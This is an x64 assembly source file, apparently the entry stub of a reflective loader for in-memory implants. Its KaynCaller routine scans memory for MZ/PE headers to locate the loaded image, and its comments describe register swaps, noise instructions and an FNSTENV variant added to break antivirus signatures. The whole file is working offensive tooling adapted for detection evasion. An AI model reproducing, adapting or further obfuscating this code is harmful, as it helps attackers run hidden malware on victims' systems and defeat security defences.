extern Entry

global Start
global GetRIP
global KaynCaller

section .text$A
	Start:
        ; Obfuscated stack frame setup to break signature
        push    rdi                    ; Different register
        mov     rdi, rsp               ; Different register  
        and     rsp, 0FFFFFFFFFFFFFFF0h
        push    rax                    ; Add noise instruction
        pop     rax                    ; Add noise instruction
        sub     rsp, 020h
        call    Entry
        mov     rsp, rdi               ; Different register
        pop     rdi                    ; Different register  
    ret

section .text$F
    KaynCaller:
        ; LEA-based RIP-relative addressing instead of CALL/POP  
        lea     rcx, [rel $]
        
        ; Alternative: Use FNSTENV method for additional obfuscation
        ; sub     rsp, 0x1c
        ; fnstenv [rsp]
        ; pop     rcx
        ; add     rsp, 0x18
        
    loop:
        xor rbx, rbx
        mov ebx, 0x5A4D
        inc rcx
        cmp bx,  [ rcx ]
        jne loop
        xor rax, rax
        mov ax,  [ rcx + 0x3C ]
        add rax, rcx
        xor rbx, rbx
        add bx,  0x4550
        cmp bx,  [ rax ]
        jne loop
        mov rax, rcx
    ret

    GetRIP:
        ; LEA-based RIP-relative addressing instead of CALL/POP
        lea     rax, [rel $]
        ret
